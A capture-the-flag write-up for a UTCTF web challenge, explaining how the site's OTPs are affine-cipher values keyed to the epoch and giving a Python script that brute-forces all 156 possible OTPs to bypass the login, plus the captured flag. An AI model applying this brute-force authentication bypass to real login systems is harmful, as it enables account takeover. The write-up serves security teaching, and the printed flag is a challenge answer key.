---
title: "Time to Pretend"
date: 2026-03-19T02:16:26+05:30
tags: ["beginner"]
categories: ["web"]
authors: ['curious_codist']
description: "Ciphery shi"
---

# Time to Pretend

<!-- DESCRIPTION -->
> Did you hear about the big AffiniTech outage earlier this week? Earlier today, someone leaked some internal traffic of theirs on the darkweb as proof that they pwned the service. But I think there's more here than just logs; maybe you can break in too?

points: `266`

solves: `264`

handouts: ```aftechLEAK.pcap```,```challenge.utctf.live:9382```(likely would go down tho..)

author: `@emdawg25`

---
## Solution
 Upon loading the site, we are met with a login page demanding a username/wallet id and an OTP. So, I did the first thing anyone does in web, I saw the / of the webpage. I found an interesting comment
 ```<!-- NOTICE to DEVS: login currently disabled, see /urgent.txt for info -->```
 The file urgent.txt read as follows:-
 ```
 i have locked every account in the system except mine while we figure this out. DO NOT
unlock anyone until we have patched this. i dont care if users complain. i dont care if
chad emails again. nobody gets in.
timothy
 ```
 We found the username, yay. Now onto, the OTP.
 Now, analyzing the pcap file, I found that we are given many POST requests to a /debug/getOTP. 
 All the requests contain a username and epoch
 Ex:- ```{"username": "carrasco", "epoch": 1773290571}```
 The responses contain an add, mult and an otp.
 Ex:- ```{"add": 13, "mult": 7, "otp": "bnccnjbh"}```
 
 This immediately looks like a affine cipher (Look at how the length of the otp and username is same and the add and mult responses).
 
 For those of you, who dont know affine cipher, its basically a substitution cipher that encrypts letters using a linear function, particularly 
 $E(x)=(A.x+B) \pmod{26}$, where $A$ is coprime to 26.
 Now, after careful observation, we realize that 
 - The additive key ( $B$ or here, add) is just simply (epoch$\pmod{26}$)
 - The multiplicative key ($A$ or here, mult) is just simply the index of the 12 coprimes of 26 - [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25] using 
  (epoch$\pmod{12}$)
  
We do this for every character in the username and get the OTP.
Now, we can attempt to know the epoch using the server time but that gives us some network latency and is unreliable. Instead, we can use our brains (woah) and see that as the keys are derieved from (epoch$\pmod{26}$) and (epoch$\pmod{12}$), the state of the cipher resets every ($LCM(26,12)=156)$ seconds. Hence, there are only 156 valid OTP's for every user on the website.
Now, lets write some code !!

--- 

## Code and output
### Code
```python
import requests
import sys

TARGET_URL = "http://challenge.utctf.live:9382"
USERNAME = "timothy"

def get_affine_otp(username, epoch):
    coprimes = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]
    a = coprimes[epoch % 12]
    b = epoch % 26
    
    otp = ""
    for char in username.lower():
        if 'a' <= char <= 'z':
            p = ord(char) - ord('a')
            c = (a * p + b) % 26
            otp += chr(c + ord('a'))
    return otp

def exploit():
    otps = list({get_affine_otp(USERNAME, i) for i in range(156)})
    s = requests.Session()
    
    for otp in otps:
        res = s.post(f"{TARGET_URL}/auth", json={"username": USERNAME, "otp": otp})
        
        if res.status_code == 200:
            print(f"[+] Auth Bypassed! OTP used: {otp}")
            portal_res = s.get(f"{TARGET_URL}/portal")
            print(portal_res.text.strip())
            sys.exit(0)

if __name__ == "__main__":
    exploit()
```
### Output
```html
[+] Auth Bypassed! OTP used: baykbhs
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AffiniTECH — Wallet Portal</title>
  .
  .
  <script>
    function copyFlag() {
      const flag = 'utflag{t1m3_1s_n0t_r3l1@bl3_n0w_1s_1t}';
      navigator.clipboard.writeText(flag).catch(() => {});
      const btn = event.target;
      btn.textContent = '[ COPIED ]';
      setTimeout(() => btn.textContent = '[ COPY ]', 2000);
    }
  </script>
```
---
```
utflag{t1m3_1s_n0t_r3l1@bl3_n0w_1s_1t}
```
---